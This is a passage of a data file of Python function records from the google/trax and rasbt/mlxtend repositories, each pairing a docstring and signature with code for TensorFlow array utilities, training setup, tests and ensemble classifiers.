"stars": 7903, "license": "apache-2.0", "language": "python", "size": 169282}
{"docstring": "\"\"\"Convenience wrapper around dynamic_slice applying to one dimension.\"\"\"\n", "func_signal": "def dynamic_slice_in_dim(operand, start_index, slice_size, axis=0):\n", "code": "operand = tf_np.asarray(operand)\nstart_indices = [0] * operand.ndim\nslice_sizes = list(operand.shape)\naxis = int(axis)\nstart_indices[axis] = start_index\nslice_sizes[axis] = int(slice_size)\nreturn dynamic_slice(operand, start_indices, slice_sizes)", "path": "trax/trax/tf_numpy/extensions/extensions.py", "commit_date": "2020-11-26 00:00:00", "repo_name": "google/trax", "stars": 7903, "license": "apache-2.0", "language": "python", "size": 169282}
{"docstring": "\"\"\"Computes log(sum(exp(elements across dimensions of a tensor))).\n\nReduces `x` along the dimensions given in `axis`.\nUnless `keepdims` is true, the rank of the tensor is reduced by 1 for each\nentry in `axis`. If `keepdims` is true, the reduced dimensions\nare retained with length 1.\nIf `axis` has no entries, all dimensions are reduced, and a\ntensor with a single element is returned.\nThis function is more numerically stable than log(sum(exp(input))). It avoids\noverflows caused by taking the exp of large inputs and underflows caused by\ntaking the log of small inputs.\n\nArgs:\n  x: The tensor to reduce. Should have numeric type.\n  axis: The dimensions to reduce. If `None` (the default), reduces all\n    dimensions. Must be in the range `[-rank(x), rank(x))`.\n  keepdims: If true, retains reduced dimensions with length 1.\n\nReturns:\n  The reduced tensor.\n\"\"\"\n", "func_signal": "def logsumexp(x, axis=None, keepdims=None):\n", "code": "return tf_np.asarray(\n    tf.math.reduce_logsumexp(\n        input_tensor=x.data, axis=axis, keepdims=keepdims))", "path": "trax/trax/tf_numpy/extensions/extensions.py", "commit_date": "2020-11-26 00:00:00", "repo_name": "google/trax", "stars": 7903, "license": "apache-2.0", "language": "python", "size": 169282}
{"docstring": "\"\"\"Convenience wrapper around dynamic_update_slice for one dimension.\"\"\"\n", "func_signal": "def dynamic_update_slice_in_dim(operand, update, start_index, axis):\n", "code": "operand = tf_np.asarray(operand)\naxis = int(axis)\nstart_indices = [0] * operand.ndim\nstart_indices[axis] = start_index\nreturn dynamic_update_slice(operand, update, start_indices)", "path": "trax/trax/tf_numpy/extensions/extensions.py", "commit_date": "2020-11-26 00:00:00", "repo_name": "google/trax", "stars": 7903, "license": "apache-2.0", "language": "python", "size": 169282}
{"docstring": "\"\"\"Calcuates the indices for `tf.gather_nd` from slices.\n\nArgs:\n  operand: a Tensor to slice.\n  start_indices: a vector Tensor of integers, one per dimension. The starts of\n    the slice. The vector can be dynamic.\n  slice_sizes: a list of integers, one per dimension. The sizes of the slice.\n\nReturns:\n  An index array suitable for `tf.gather_nd` and `tf.scatter_nd`, or `None` if\n  `operand` is a scalar.\n\"\"\"\n", "func_signal": "def _get_dynamic_indices(operand, start_indices, slice_sizes):\n", "code": "rank = len(slice_sizes)\noperand_rank = tf.rank(operand)\ntf.debugging.Assert(operand_rank == rank, [operand_rank, rank])\nstarts_rank = tf.rank(start_indices)\ntf.debugging.Assert(starts_rank == 1, [starts_rank])\nnum_starts = tf.shape(start_indices)[0]\ntf.debugging.Assert(num_starts == rank, [num_starts, rank])\noperand_shape = tf.shape(operand)\ntf.debugging.Assert(tf.reduce_all(slice_sizes <= operand_shape),\n                    [slice_sizes, operand_shape])\nif rank == 0:\n  return None\nstart_indices = tf.where(\n    start_indices < 0, start_indices + operand_shape, start_indices)\nidx_list = []\nfor i in range(rank):\n  start = start_indices[i]\n  size = slice_sizes[i]\n  dim = operand_shape[i]\n  start = tf.clip_by_value(start, 0, dim - size)\n  # XLA requires tf.range's `start` to be compile-time constant, so we can't\n  # do tf.range(start, ...).\n  idx = start + tf.range(size)\n  shape = [1] * rank\n  shape[i] = size\n  idx = tf.reshape(idx, shape)\n  idx_list.append(idx)\nslice_sizes_tensor = tf.convert_to_tensor(slice_sizes)\n# tf.stack doesn't support broadcasting, so we need to broadcast manually.\n# TODO(wangpeng): Reduce peak memory by broadcasting one-by-one instead of\n#   all-together.\nidx_list = [tf.broadcast_to(x, slice_sizes_tensor) for x in idx_list]\nreturn tf.stack(idx_list, axis=-1)", "path": "trax/trax/tf_numpy/extensions/extensions.py", "commit_date": "2020-11-26 00:00:00", "repo_name": "google/trax", "stars": 7903, "license": "apache-2.0", "language": "python", "size": 169282}
{"docstring": "# Get the eval mode outputs:\n", "func_signal": "def test_inference(self, n, t, c):\n", "code": "encoding = self.Encoding(mode='eval')\ninput_ntc = np.random.randn(n, t, c)\nrng = fastmath.random.get_prng(1234)\nencoding.init(input_ntc, rng=rng)\noutput_ntc = encoding(input_ntc)\n\nis_random = self.Encoding == pe.InfinitePositionalEncoding\n\n# Get the predict mode outputs:\nencoding_pred = self.Encoding(mode='predict')\nencoding_pred.init(input_ntc[:, 0:1, :], rng=rng)\noutput_ntc0 = encoding_pred(input_ntc[:, 0:1, :])\nif not is_random:\n  np.testing.assert_allclose(output_ntc0, output_ntc[:, 0:1, :], atol=1e-4)\n\noutput_ntc1 = encoding_pred(input_ntc[:, 1:2, :])\nif not is_random:\n  np.testing.assert_allclose(output_ntc1, output_ntc[:, 1:2, :], atol=1e-4)\n\noutput_ntc2 = encoding_pred(input_ntc[:, 2:3, :])\nif not is_random:\n  np.testing.assert_allclose(output_ntc2, output_ntc[:, 2:3, :], atol=1e-4)", "path": "trax/trax/layers/research/position_encodings_test.py", "commit_date": "2020-06-27 00:00:00", "repo_name": "google/trax", "stars": 7903, "license": "apache-2.0", "language": "python", "size": 169282}
{"docstring": "\"\"\"The general dot operation for TensorFlow.\n\nAn equivalent general dot operation as that in JAX -\n   <https://jax.readthedocs.io/en/latest/_autosummary/jax.lax.dot_general.html>\nAlthough there is an implementation in TF XLA, avoid directly using XLA when\npossible.\n\ne.g., non-batched: ij,jk->ik\n      batched: ijk,ikl->ijl\n\nArgs:\n  lhs: an array (the left-hand side matrix/vector to be multiplied)\n  rhs: an array (the right-hand side matrix/vector to be multiplied)\n  dimension_numbers: (Tuple[Tuple[Sequence[int], Sequence[int]],\n    Tuple[Sequence[int], Sequence[int]]]) \u2013 a tuple of tuples of the form\n    ((lhs_contracting_dims, rhs_contracting_dims), (lhs_batch_dims,\n    rhs_batch_dims))\n\nReturns:\n  An array that contains the result.\n\"\"\"\n", "func_signal": "def tf_dot_general(lhs, rhs, dimension_numbers):\n", "code": "char_list = list(string.ascii_lowercase)\nchar_list = char_list[8:] + char_list[:8]\nlhs_rank, rhs_rank = len(lhs.shape), len(rhs.shape)\nlhs_rep = char_list[:lhs_rank]\nrhs_rep = char_list[lhs_rank:lhs_rank + rhs_rank]\ncontraction, batch = dimension_numbers\nlhs_contraction, rhs_contraction = contraction\nif len(lhs_contraction) != len(rhs_contraction):\n  raise ValueError(\n      \"The input matrices are required to have the same number \"\n      \"of contraction dimensions, but got: lhs {}, rhs: {}\".format(\n          len(lhs_contraction), len(rhs_contraction)))\nlhs_batch, rhs_batch = batch\nif len(lhs_batch) != len(rhs_batch):\n  raise ValueError(\"The input matrices are required to have the same number \"\n                   \"of batch dimensions, but got: lhs {}, rhs: {}\".format(\n                       len(lhs_batch), len(rhs_batch)))\n\nif not lhs_batch and not rhs_batch:\n  return _non_batched_matmul(lhs, rhs, lhs_contraction, rhs_contraction)\n\nif (lhs_rank == rhs_rank == 3 and lhs_batch == (0,) and rhs_batch == (0,) and\n    lhs_contraction == (2,) and rhs_contraction == (1,)):\n  return tf.linalg.matmul(lhs, rhs)\n\nfor i in range(len(lhs_contraction)):\n  rhs_rep[rhs_contraction[i]] = lhs_rep[lhs_contraction[i]]\nfor i in range(len(lhs_batch)):\n  rhs_rep[rhs_batch[i]] = lhs_rep[lhs_batch[i]]\n\noutput_rep = _compose_output_rep(lhs_rep, rhs_rep, lhs_contraction,\n                                 rhs_contraction, lhs_batch, rhs_batch)\nequation = \"\".join(lhs_rep) + \",\" + \"\".join(rhs_rep) + \"->\" + output_rep\nreturn tf.einsum(equation, lhs, rhs)", "path": "trax/trax/tf_numpy/extensions/extensions.py", "commit_date": "2020-11-26 00:00:00", "repo_name": "google/trax", "stars": 7903, "license": "apache-2.0", "language": "python", "size": 169282}
{"docstring": "\"\"\"This is a helper function to return the pmap impl.\n\nArgs:\n  f: a function that takes ndarrays and returns ndarrays.\n  devices: a list of strings; the device list.\n  has_tpu: boolean; whether `devices` contains TPU devices.\n\nReturns:\n  A function that takes tensors and returns tensors.\n\"\"\"\n", "func_signal": "def _get_pmap_impl(f, devices, has_tpu):\n", "code": "if has_tpu:\n  # Workaround b/121383831\n  output_is_list = [False]  # Use list for mutability\n  def recorder(args, kwargs, res):\n    del args, kwargs\n    output_is_list[0] = isinstance(res, list)\n    return res\n  f = _record_result_type(recorder, f)\n\ndef tf_f(*tf_args):\n  \"\"\"A wrapper for `f` that takes/returns tensors.\"\"\"\n  np_args = _tf_to_np(tf_args)\n  np_out = f(*np_args)\n  return _np_to_tf(np_out)\n\nif has_tpu:\n\n  @tf.function(autograph=False)\n  def fn(inputs):\n    # TODO(wangpeng): Supply the `device_assignment` argument to\n    # tpu.replicate, calculated from `devices`.\n    res = tf.compat.v1.tpu.replicate(tf_f, inputs)\n    # Workaround b/121383831\n    if (res and isinstance(res[0], list) and len(res[0]) == 1 and\n        not output_is_list[0]):\n      res = [x[0] for x in res]\n    return res\n\n  return fn\nelse:\n  # This is run in a tf.function so that the various underlying functions can\n  # be run in parallel.\n  # The trace happens on the client, so any devices should not depend on any\n  # side effects.\n\n  jit_tf_f = tf.function(tf_f, autograph=False)\n\n  @tf.function(autograph=False)\n  def fn(all_per_device_args):\n    \"\"\"Multi-device function with calls placed on the correct device.\"\"\"\n\n    results = []\n    for per_device_args, device in zip(all_per_device_args, devices):\n      with tf.device(device):\n        results.append(jit_tf_f(*per_device_args))\n    return results\n\n  return fn", "path": "trax/trax/tf_numpy/extensions/extensions.py", "commit_date": "2020-11-26 00:00:00", "repo_name": "google/trax", "stars": 7903, "license": "apache-2.0", "language": "python", "size": 169282}
{"docstring": "\"\"\"Returns samples from a normal distribution.\n\nUses `tf.random_normal`.\n\nArgs:\n  *args: The shape of the output array.\n\nReturns:\n  An ndarray with shape `args` and dtype `float64`.\n\"\"\"\n# TODO(wangpeng): Use new stateful RNG\n", "func_signal": "def randn(*args):\n", "code": "if utils.isscalar(args):\n  args = (args,)\nreturn utils.tensor_to_ndarray(\n    tf.random.normal(args, dtype=DEFAULT_RANDN_DTYPE))", "path": "trax/trax/tf_numpy/numpy_impl/random.py", "commit_date": "2020-06-05 00:00:00", "repo_name": "google/trax", "stars": 7903, "license": "apache-2.0", "language": "python", "size": 169282}
{"docstring": "\"\"\"Converts an RNG key to an RNG seed.\n\nArgs:\n  a: an RNG key, an ndarray of shape [] and dtype `np.int64`.\n\nReturns:\n  an RNG seed, a tensor of shape [2] and dtype `tf.int32`.\n\"\"\"\n\n", "func_signal": "def _key2seed(a):\n", "code": "def int64_to_int32s(a):\n  \"\"\"Converts an int64 tensor of shape [] to an int32 tensor of shape [2].\"\"\"\n  a = tf.cast(a, tf.uint64)\n  fst = tf.cast(a, tf.uint32)\n  snd = tf.cast(\n      tf.bitwise.right_shift(a, tf.constant(32, tf.uint64)), tf.uint32)\n  a = [fst, snd]\n  a = tf.nest.map_structure(lambda x: tf.cast(x, tf.int32), a)\n  a = tf.stack(a)\n  return a\n\nreturn int64_to_int32s(a.data)", "path": "trax/trax/tf_numpy/extensions/extensions.py", "commit_date": "2020-11-26 00:00:00", "repo_name": "google/trax", "stars": 7903, "license": "apache-2.0", "language": "python", "size": 169282}
{"docstring": "\"\"\"Returns a path to the output directory.\"\"\"\n", "func_signal": "def _output_dir_or_default():\n", "code": "if FLAGS.output_dir:\n  output_dir = FLAGS.output_dir\n  trainer_lib.log('Using --output_dir {}'.format(output_dir))\n  return os.path.expanduser(output_dir)\n\n# Else, generate a default output dir (under the user's home directory).\ntry:\n  dataset_name = gin.query_parameter('data_streams.dataset_name')\nexcept ValueError:\n  dataset_name = 'random'\noutput_name = '{model_name}_{dataset_name}_{timestamp}'.format(\n    model_name=gin.query_parameter('train.model').configurable.name,\n    dataset_name=dataset_name,\n    timestamp=datetime.datetime.now().strftime('%Y%m%d_%H%M'),\n)\noutput_dir = os.path.join('~', 'trax', output_name)\noutput_dir = os.path.expanduser(output_dir)\nprint()\ntrainer_lib.log('No --output_dir specified')\ntrainer_lib.log('Using default output_dir: {}'.format(output_dir))\nreturn output_dir", "path": "trax/trax/trainer.py", "commit_date": "2020-10-05 00:00:00", "repo_name": "google/trax", "stars": 7903, "license": "apache-2.0", "language": "python", "size": 169282}
{"docstring": "\"\"\"Initializes the ShardedNdArray.\n\nNote that the tensors should be ordered in the way the pmap producing these\ntensors is run.\n\nArgs:\n  tensors: list or tuple of eager tensors, one for each device.\n\"\"\"\n\n", "func_signal": "def __init__(self, tensors):\n", "code": "if not isinstance(tensors, (list, tuple)) or not tensors:\n  raise ValueError(\n      \"Unable to create a ShardedNdArray without a list of tensors.\")\nself.tensors = tensors\nself.n_devices = len(tensors)", "path": "trax/trax/tf_numpy/extensions/extensions.py", "commit_date": "2020-11-26 00:00:00", "repo_name": "google/trax", "stars": 7903, "license": "apache-2.0", "language": "python", "size": 169282}
{"docstring": "\"\"\"Initializes gin-controlled bindings.\"\"\"\n# Imports for configurables\n# pylint: disable=g-import-not-at-top,unused-import,g-bad-import-order,reimported,unused-variable\n", "func_signal": "def _gin_parse_configs():\n", "code": "from trax import models as _trax_models\nfrom trax import optimizers as _trax_opt\n# pylint: disable=g-import-not-at-top,unused-import,g-bad-import-order,reimported,unused-variable\n\nconfigs = FLAGS.config if FLAGS.config is not None else []\n# Override with --dataset and --model\nif FLAGS.dataset:\n  configs.append(\"data_streams.dataset_name='%s'\" % FLAGS.dataset)\nif FLAGS.data_dir:\n  configs.append(\"data_streams.data_dir='%s'\" % FLAGS.data_dir)\nif FLAGS.model:\n  configs.append('train.model=@trax.models.%s' % FLAGS.model)\ngin.parse_config_files_and_bindings(FLAGS.config_file, configs)", "path": "trax/trax/trainer.py", "commit_date": "2020-10-05 00:00:00", "repo_name": "google/trax", "stars": 7903, "license": "apache-2.0", "language": "python", "size": 169282}
{"docstring": "\"\"\"Splits an RNG seed into `num` new seeds by adding a leading axis.\n\nExample:\n\n>>> seed = [1, 2]\n>>> new_seeds = tf.random.experimental.stateless_split(seed, num=3)\n>>> print(new_seeds)\ntf.Tensor(\n[[1105988140 1738052849]\n [-335576002  370444179]\n [  10670227 -246211131]], shape=(3, 2), dtype=int32)\n>>> tf.random.stateless_normal(shape=[3], seed=new_seeds[0, :])\n<tf.Tensor: shape=(3,), dtype=float32, numpy=array([-0.59835213, -0.9578608 ,\n0.9002807 ], dtype=float32)>\n\nArgs:\n  seed: an RNG seed (a tensor with shape [2] and dtype `int32` or `int64`).\n    (When using XLA, only `int32` is allowed.)\n  num: optional, a positive integer or scalar tensor indicating the number of\n    seeds to produce (default 2).\n\nReturns:\n  A tensor with shape [num, 2] representing `num` new seeds. It will have the\n  same dtype as `seed` (if `seed` doesn't have an explict dtype, the dtype\n  will be determined by `tf.convert_to_tensor`).\n\"\"\"\n", "func_signal": "def stateless_split(seed, num=2):\n", "code": "seed = tf.convert_to_tensor(seed)\nreturn tf.random.stateless_uniform(\n    shape=[num, 2], seed=seed, dtype=seed.dtype, minval=None, maxval=None)", "path": "trax/trax/tf_numpy/extensions/extensions.py", "commit_date": "2020-11-26 00:00:00", "repo_name": "google/trax", "stars": 7903, "license": "apache-2.0", "language": "python", "size": 169282}
{"docstring": "\"\"\"Updates a dynamic slice.\n\nSee the docstring of `jax.lax.dynamic_update_slice`\n(https://jax.readthedocs.io/en/latest/_autosummary/jax.lax.dynamic_update_slice.html)\nfor details.\n\nArgs:\n  operand: an array to slice.\n  update: an array containing the new values to write onto `operand`.\n  start_indices: a vector of integers, one per dimension. The starts of the\n    slice. The vector can be dynamic.\n\nReturns:\n  The updated version of `operand`.\n\"\"\"\n", "func_signal": "def dynamic_update_slice(operand, update, start_indices):\n", "code": "operand = tf_np.asarray(operand).data\nupdate = tf_np.asarray(update).data\nstart_indices = tf_np.asarray(start_indices, np.int32).data\nif not update.shape.is_fully_defined():\n  raise ValueError(\"update's shape must be fully defined\")\nslice_sizes = update.shape\nidx = _get_dynamic_indices(operand, start_indices, slice_sizes)\nif idx is None:\n  # `np.zeros([])[()] = 1.0` will result in a scalar array of 1.0\n  return tf_np.asarray(update)\noperand = tf.tensor_scatter_nd_update(operand, idx, update)\nreturn tf_np.asarray(operand)", "path": "trax/trax/tf_numpy/extensions/extensions.py", "commit_date": "2020-11-26 00:00:00", "repo_name": "google/trax", "stars": 7903, "license": "apache-2.0", "language": "python", "size": 169282}
{"docstring": "\"\"\"Returns a function that evaluates `f` given input shapes and dtypes.\n\nIt transforms function `f` to a function that performs the same computation as\n`f` but only on shapes and dtypes (a.k.a. shape inference).\n\nArgs:\n  f: the function to be transformed.\n  static_argnums: see documentation of `jit`.\n  allow_static_outputs: whether to allow non-array outputs. If True, non-array\n    outputs (e.g. Python integers) will be returned as-is; otherwise, they\n    will be converted to ndarrays, and then specs of those ndarrays will be\n    returned.\n\nReturns:\n  A function whose input arguments can be either the same as `f`'s or only\n  their shapes/dtypes represented by `tf.TensorSpec`, and whose return values\n  are `tf.TensorSpec`s with the same nested structure as `f`'s return\n  values. If `allow_static_outputs` is True, when `f` returns some non-array\n  outputs (e.g. Python integers), the converted function will return them\n  as-is instead of returning `tf.TensorSpec`s for them.\n\"\"\"\n", "func_signal": "def eval_on_shapes(f, static_argnums=(), allow_static_outputs=False):\n", "code": "def abstractify(args):\n  def _abstractify(x):\n    x = _canonicalize_jit_arg(x)\n    if isinstance(x, (tf.Tensor, tf_np.ndarray)):\n      return tf.TensorSpec(x.shape, x.dtype)\n    else:\n      return x\n  new_args = []\n  for i, arg in enumerate(args):\n    if i in static_argnums:\n      new_args.append(arg)\n    else:\n      new_args.append(tf.nest.map_structure(_abstractify, arg))\n  return new_args\n\nif allow_static_outputs:\n  # When `tf_f` below is called (via get_concrete_function) with the same\n  # arugments (after abstraction), the Python function `f` won't be run, so we\n  # need this python_outputs_map to retrieve the Python outputs we've seen\n  # before that correspond the arguments.\n  python_outputs_map = {}\n  def recorder(args, kwargs, res):\n    # Since the get_concrete_function below only uses positional args, we also\n    # only positional args here.\n    del args, kwargs\n    def is_tensor_like(x):\n      if hasattr(x, \"_type_spec\"):\n        return True  # x is a CompositeTensor\n      return isinstance(x, (tf_np.ndarray, tf.Tensor))\n    py_values = tf.nest.map_structure(\n        lambda x: None if is_tensor_like(x) else x,\n        res)\n    key = id(tf.compat.v1.get_default_graph())\n    python_outputs_map[key] = py_values\n    # Set non-tensor outputs to None to avoid tf.function calling\n    # tf.convert_to_tensor on them.\n    res = tf.nest.map_structure(\n        lambda x: None if not is_tensor_like(x) else x,\n        res)\n    return res\n  f = _record_result_type(recorder, f)\n\n# TODO(wangpeng): tf.function could add a knob to turn off materializing the\n#   graph, so that we don't waste computation and memory when we just want\n#   shape inference.\ntf_f = jit(f, static_argnums=static_argnums).tf_function\n\n# pylint: disable=missing-docstring\ndef f_return(*args):\n  def to_tensor_spec(x):\n    if isinstance(x, tf.Tensor):\n      return tf.TensorSpec(x.shape, x.dtype)\n    else:\n      return x\n\n  new_args = abstractify(args)\n  cfun = tf_f.get_concrete_function(*new_args)\n  res = cfun.structured_outputs\n  res = tf.nest.map_structure(to_tensor_spec, res)\n\n  if allow_static_outputs:\n    key = id(cfun.graph)\n    py_values = python_outputs_map[key]\n    # We can also call tf.get_static_value on structured_outputs to retrieve\n    # the Python values, but since we'll need to use python_outputs_map to\n    # record \"which outputs are static?\" anyway, we choose to directly store\n    # the Python values in python_outputs_map.\n    res = tf.nest.map_structure(\n        lambda x, python_value: x if python_value is None else python_value,\n        res, py_values)\n\n  return res\n\n# Provides access to `tf_f` for testing purpose.\nf_return._tf_function = tf_f  # pylint: disable=protected-access\nreturn f_return", "path": "trax/trax/tf_numpy/extensions/extensions.py", "commit_date": "2020-11-26 00:00:00", "repo_name": "google/trax", "stars": 7903, "license": "apache-2.0", "language": "python", "size": 169282}
{"docstring": "\"\"\"Signatures of all sizes should give correct length when asked.\"\"\"\n", "func_signal": "def test_len_signature(self):\n", "code": "x1 = np.array([1, 2, 3])\nx2 = np.array([10, 20, 30])\ninputs0 = ()\ninputs1 = x1  # NOT in a tuple\ninputs2 = (x1, x2)\n\nsig0 = shapes.signature(inputs0)\nsig1 = shapes.signature(inputs1)\nsig2 = shapes.signature(inputs2)\n\n# pylint: disable=g-generic-assert\nself.assertEqual(len(sig0), 0)\nself.assertEqual(len(sig1), 1)\nself.assertEqual(len(sig2), 2)\n# pylint: enable=g-generic-assert", "path": "trax/trax/shapes_test.py", "commit_date": "2020-04-22 00:00:00", "repo_name": "google/trax", "stars": 7903, "license": "apache-2.0", "language": "python", "size": 169282}
{"docstring": "\"\"\"Returns a matrix where each sample in y is represented\n   as a row, and each column represents the class label in\n   the one-hot encoding scheme.\n\nExample:\n\n    y = np.array([0, 1, 2, 3, 4, 2])\n    mc = _BaseMultiClass()\n    mc._one_hot(y=y, n_labels=5, dtype='float')\n\n    np.array([[1., 0., 0., 0., 0.],\n              [0., 1., 0., 0., 0.],\n              [0., 0., 1., 0., 0.],\n              [0., 0., 0., 1., 0.],\n              [0., 0., 0., 0., 1.],\n              [0., 0., 1., 0., 0.]])\n\n\"\"\"\n", "func_signal": "def _one_hot(self, y, n_labels, dtype):\n", "code": "mat = np.zeros((len(y), n_labels))\nfor i, val in enumerate(y):\n    mat[i, val] = 1\nreturn mat.astype(dtype)", "path": "mlxtend/mlxtend/_base/_multiclass.py", "commit_date": "2020-01-07 00:00:00", "repo_name": "rasbt/mlxtend", "stars": 4731, "license": "other", "language": "python", "size": 96943}
{"docstring": "\"\"\" Get meta-features of test-data.\n\nParameters\n----------\nX : numpy array, shape = [n_samples, n_features]\n    Test vectors, where n_samples is the number of samples and\n    n_features is the number of features.\n\nReturns\n-------\nmeta-features : numpy array, shape = [n_samples, n_classifiers]\n    Returns the meta-features for test data.\n\n\"\"\"\n", "func_signal": "def predict_meta_features(self, X):\n", "code": "check_is_fitted(self, ['clfs_', 'meta_clf_'])\n\nper_model_preds = []\n\nfor model in self.clfs_:\n    if not self.use_probas:\n        prediction = model.predict(X)[:, np.newaxis]\n    else:\n        if self.drop_proba_col == 'last':\n            prediction = model.predict_proba(X)[:, :-1]\n        elif self.drop_proba_col == 'first':\n            prediction = model.predict_proba(X)[:, 1:]\n        else:\n            prediction = model.predict_proba(X)\n\n    per_model_preds.append(prediction)\n\nreturn np.hstack(per_model_preds)", "path": "mlxtend/mlxtend/classifier/stacking_cv_classification.py", "commit_date": "2020-04-04 00:00:00", "repo_name": "rasbt/mlxtend", "stars": 4731, "license": "other", "language": "python", "size": 96943}
{"docstring": "\"\"\"\nCreates and returns the subtree of self conditioned on cond_item.\n\nParameters\n----------\ncond_item : int | str\n    Item that the tree (self) will be conditioned on.\nminsup : int\n    Minimum support threshold.\n\nReturns\n-------\ncond_tree : FPtree\n\"\"\"\n# Find all path from root node to nodes for item\n", "func_signal": "def conditional_tree(self, cond_item, minsup):\n", "code": "branches = []\ncount = collections.defaultdict(int)\nfor node in self.nodes[cond_item]:\n    branch = node.itempath_from_root()\n    branches.append(branch)\n    for item in branch:\n        count[item] += node.count\n\n# Define new ordering or deep trees may have combinatorially explosion\nitems = [item for item in count if count[item] >= minsup]\nitems.sort(key=count.get)\nrank = {item: i for i, item in enumerate(items)}\n\n# Create conditional tree\ncond_tree = FPTree(rank)\nfor idx, branch in enumerate(branches):\n    branch = sorted([i for i in branch if i in rank],\n                    key=rank.get, reverse=True)\n    cond_tree.insert_itemset(branch, self.nodes[cond_item][idx].count)\ncond_tree.cond_items = self.cond_items + [cond_item]\n\nreturn cond_tree", "path": "mlxtend/mlxtend/frequent_patterns/fpcommon.py", "commit_date": "2020-02-24 00:00:00", "repo_name": "rasbt/mlxtend", "stars": 4731, "license": "other", "language": "python", "size": 96943}
{"docstring": "\"\"\" Fit ensemble classifers and the meta-classifier.\n\nParameters\n----------\nX : numpy array, shape = [n_samples, n_features]\n    Training vectors, where n_samples is the number of samples and\n    n_features is the number of features.\n\ny : numpy array, shape = [n_samples]\n    Target values.\n\ngroups : numpy array/None, shape = [n_samples]\n    The group that each sample belongs to. This is used by specific\n    folding strategies such as GroupKFold()\n\nsample_weight : array-like, shape = [n_samples], optional\n    Sample weights passed as sample_weights to each regressor\n    in the regressors list as well as the meta_regressor.\n    Raises error if some regressor does not support\n    sample_weight in the fit() method.\n\nReturns\n-------\nself : object\n\n\"\"\"\n", "func_signal": "def fit(self, X, y, groups=None, sample_weight=None):\n", "code": "if self.use_clones:\n    self.clfs_ = clone(self.classifiers)\n    self.meta_clf_ = clone(self.meta_classifier)\nelse:\n    self.clfs_ = self.classifiers\n    self.meta_clf_ = self.meta_classifier\nif self.verbose > 0:\n    print(\"Fitting %d classifiers...\" % (len(self.classifiers)))\n\nfinal_cv = check_cv(self.cv, y, classifier=self.stratify)\nif isinstance(self.cv, int):\n    # Override shuffle parameter in case of self generated\n    # cross-validation strategy\n    final_cv.shuffle = self.shuffle\n    final_cv.random_state = self.random_state\n\n# Disable global input validation, because it causes issue when\n# pipelines are used that perform preprocessing on X. I.e., X may\n# not be directly passed to the classifiers, which is why this code\n# would raise unecessary errors at this point.\n# X, y = check_X_y(X, y, accept_sparse=['csc', 'csr'], dtype=None)\n\nif sample_weight is None:\n    fit_params = None\nelse:\n    fit_params = dict(sample_weight=sample_weight)\n\nmeta_features = None\n\nfor n, model in enumerate(self.clfs_):\n\n    if self.verbose > 0:\n        i = self.clfs_.index(model) + 1\n        print(\"Fitting classifier%d: %s (%d/%d)\" %\n              (i, _name_estimators((model,))[0][0],\n               i, len(self.clfs_)))\n\n    if self.verbose > 2:\n        if hasattr(model, 'verbose'):\n            model.set_params(verbose=self.verbose - 2)\n\n    if self.verbose > 1:\n        print(_name_estimators((model,))[0][1])\n\n    prediction = cross_val_predict(\n        model, X, y, groups=groups, cv=final_cv,\n        n_jobs=self.n_jobs, fit_params=fit_params,\n        verbose=self.verbose, pre_dispatch=self.pre_dispatch,\n        method='predict_proba' if self.use_probas else 'predict')\n\n    if not self.use_probas:\n        prediction = prediction[:, np.newaxis]\n    elif self.drop_proba_col == 'last':\n        prediction = prediction[:, :-1]\n    elif self.drop_proba_col == 'first':\n        prediction = prediction[:, 1:]\n\n    if meta_features is None:\n        meta_features = prediction\n    else:\n        meta_features = np.column_stack((meta_features, prediction))\n\nif self.store_train_meta_features:\n    self.train_meta_features_ = meta_features\n\n# Fit the base models correctly this time using ALL the training set\nfor model in self.clfs_:\n    if sample_weight is None:\n        model.fit(X, y)\n    else:\n        model.fit(X, y, sample_weight=sample_weight)\n\n# Fit the secondary model\nif self.use_features_in_secondary:\n    meta_features = self._stack_first_level_features(\n        X,\n        meta_features\n    )\n\nif sample_weight is None:\n    self.meta_clf_.fit(meta_features, y)\nelse:\n    self.meta_clf_.fit(meta_features, y,\n                       sample_weight=sample_weight)\n\nreturn self", "path": "mlxtend/mlxtend/classifier/stacking_cv_classification.py", "commit_date": "2020-04-04 00:00:00", "repo_name": "rasbt/mlxtend", "stars": 4731, "license": "other", "language": "python", "size": 96943}
{"docstring": "\"\"\" Predict class probabilities for X.\n\nParameters\n----------\nX : {array-like, sparse matrix}, shape = [n_samples, n_features]\n    Training vectors, where n_samples is the number of samples and\n    n_features is the number of features.\n\nReturns\n----------\nproba : array-like, shape = [n_samples, n_classes] or a list of \\\n        n_outputs of such arrays if n_outputs > 1.\n    Probability for each class per sample.\n\n\"\"\"\n", "func_signal": "def predict_proba(self, X):\n", "code": "check_is_fitted(self, ['clfs_', 'meta_clf_'])\n\nreturn self._do_predict(X, self.meta_clf_.predict_proba)", "path": "mlxtend/mlxtend/classifier/_base_classification.py", "commit_date": "2019-12-07 00:00:00", "repo_name": "rasbt/mlxtend", "stars": 4731, "license": "other", "language": "python", "size": 96943}
{"docstring": "\"\"\" Return a copy of the input array.\n\nParameters\n----------\nX : {array-like, sparse matrix}, shape = [n_samples, n_features]\n    Training vectors, where n_samples is the number of samples and\n    n_features is the number of features.\ny : array-like, shape = [n_samples] (default: None)\n\nReturns\n---------\nX_copy : copy of the input X array.\n\n\"\"\"\n", "func_signal": "def transform(self, X, y=None):\n", "code": "if isinstance(X, list):\n    return np.asarray(X)\nelif isinstance(X, np.ndarray) or issparse(X):\n    return X.copy()\nelse:\n    raise ValueError('X must be a list or NumPy array'\n                     ' or SciPy sparse array. Found %s'\n                     % type(X))", "path": "mlxtend/mlxtend/preprocessing/copy_transformer.py", "commit_date": "2020-01-07 00:00:00", "repo_name": "rasbt/mlxtend", "stars": 4731, "license": "other", "language": "python", "size": 96943}
{"docstring": "\"\"\" Returns the top-down sequence of items from self to\n    (but not including) the root node. \"\"\"\n", "func_signal": "def itempath_from_root(self):\n", "code": "path = []\nif self.item is None:\n    return path\n\nnode = self.parent\nwhile node.item is not None:\n    path.append(node.item)\n    node = node.parent\n\npath.reverse()\nreturn path", "path": "mlxtend/mlxtend/frequent_patterns/fpcommon.py", "commit_date": "2020-02-24 00:00:00", "repo_name": "rasbt/mlxtend", "stars": 4731, "license": "other", "language": "python", "size": 96943}
